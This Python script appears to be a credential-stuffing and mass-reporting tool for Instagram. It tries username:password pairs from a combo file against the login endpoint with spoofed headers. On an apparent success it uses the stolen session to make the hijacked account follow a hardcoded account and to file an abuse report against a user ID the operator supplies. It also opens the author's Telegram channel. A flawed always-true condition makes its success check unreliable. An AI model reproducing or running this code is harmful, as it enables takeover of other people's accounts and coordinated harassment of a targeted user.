import  sys, os, random, time
import os,sys
import subprocess
from bs4 import BeautifulSoup
import json, requests, os, sys, time, datetime
import requests
from datetime import datetime
from user_agent import generate_user_agent as us
if os.name=='nt':oss="cls"
else:oss="clear"
try:os.system("combo.txt")
except:pass
if os.name=='nt':os.system("start https://t.me/itsmepalabun")
else:os.system("xdg-open https://t.me/itsmepalabun")
os.system(oss)
os.system(oss)
logo1='''
____       _       _
|  _ \ __ _| | __ _| |__  _   _ _ __
| |_) / _` | |/ _` | '_ \| | | | '_ \
|  __/ (_| | | (_| | |_) | |_| | | | |
|_|   \__,_|_|\__,_|_.__/ \__,_|_| |_|
cod By @i4m_palabun
'''
logo2='''
____       _       _
|  _ \ __ _| | __ _| |__  _   _ _ __
| |_) / _` | |/ _` | '_ \| | | | '_ \
|  __/ (_| | | (_| | |_) | |_| | | | |
|_|   \__,_|_|\__,_|_.__/ \__,_|_| |_|
cod By @i4m_palabun
'''
bad=0
hits=0
checkpoint=0
timeout=0
kill=0
error=0
total=0
tesed=0
print(logo1)
try:
	filo=input(" Path File Combo > ")
	bale=input("\n Get : https://codeofaninja.com/tools/find-instagram-user-id/\n\n ID Kasaka Dane: ")
	print(" wait")
	file=open(filo,"r").read().splitlines()
	for hara in file:
		total+=1
except:
	print(" halayakt krd")
	pass
file=open(filo,"r").read().splitlines()
for line in file:
	user=line.split(':')[0]
	pasw=line.split(':')[1]
	url = 'https://www.instagram.com/accounts/login/ajax/'
	head = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'269','content-type':'application/x-www-form-urlencoded','cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent': us(),'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'8a8118fa7d40','x-requested-with':'XMLHttpRequest'}
	urll = 'https://www.instagram.com/web/friendships/44727257007/follow/'
	time_now = int(datetime.now().timestamp())
	data = {'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),'queryParams': {},'optIntoOneTap': 'false',}
	login = requests.post(url,headers=head,data=data,allow_redirects=True,verify=True)
	import time
	time.sleep(3)
	if '"authenticated":false' in login.text:
		os.system(oss)
		print(logo2)
		error+=1
		tesed+=1
		print(f'  [T]otal : {total}\n    [^] Tested : '+str(tesed)+'\n    [+] Reported : '+str(hits)+' \n    [-] Error Login : '+str(error)+'\n\n -------------------------------------------\n')
	elif '"message":"Please wait a few minutes before you try again."' in login.text:
		os.system(oss)
		print(logo2)
		timeout+=1
		import time
		tesed+=1
		print(f'  [T]otal : {total}\n    [^] Tested : '+str(tesed)+'\n    [+] Reported : '+str(hits)+' \n    [-] Error Login : '+str(error)+'\n\n -------------------------------------------\n')
		time.sleep(30)
	elif 'userId' or '"authenticated":true' in login.text:
		import user_agent
		os.system(oss)
		print(logo2)
		tesed+=1
		hits+=1
		cook = login.cookies['sessionid']
		hedDLT = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-45no7B-A6FA-6F83AD1717DE; ig_nrcb=1; csrftoken=wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi; ds_user_id=46165248972; sessionid='+cook,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/_papulakam__0/follow/','sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken': 'wYPaFI4U1osqOiXc2Tv5vOsNgTdBwrxi','x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR0EWvjix_XsqAIjAt7fjL3qLwQKCRTB8UMXTGL5j7pkgYkq','x-instagram-ajax': '753ce878cd6d','x-requested-with': 'XMLHttpRequest'}
		data_get_info = {'__a': '1'}
		try:requests.post(urll,headers=hedDLT)
		except:pass
		r=requests.session()
		r.headers.update({'x-csrftoken': login.cookies['csrftoken']})
		print(f'  [T]otal : {total}\n    [^] Tested : '+str(tesed)+'\n    [+] Reported : '+str(hits)+' \n    [-] Error Login : '+str(error)+'\n\n -------------------------------------------\n')
		url_spam = 'https://www.instagram.com/users/{}/report/'.format(bale)
		data_spam = {'source_name': '','reason_id': 1,'frx_context': ''}
		requests.post(url_spam, data=data_spam)
	elif ('"message":"checkpoint_required"') in login.text:
		os.system(oss)
		print(logo2)
		error+=1
		tesed+=1
		boooomm=("CHK: "+user+":"+pasw)
		print(f'  [T]otal : {total}\n    [^] Tested : '+str(tesed)+'\n    [+] Reported : '+str(hits)+' \n    [-] Error Login : '+str(error)+'\n\n -------------------------------------------\n')
	else:
		os.system(oss)
		print(logo2)
		error+=1
		tesed+=1
		print(f'  [T]otal : {total}\n    [^] Tested : '+str(tesed)+'\n    [+] Reported : '+str(hits)+' \n    [-] Error Login : '+str(error)+'\n\n -------------------------------------------\n')
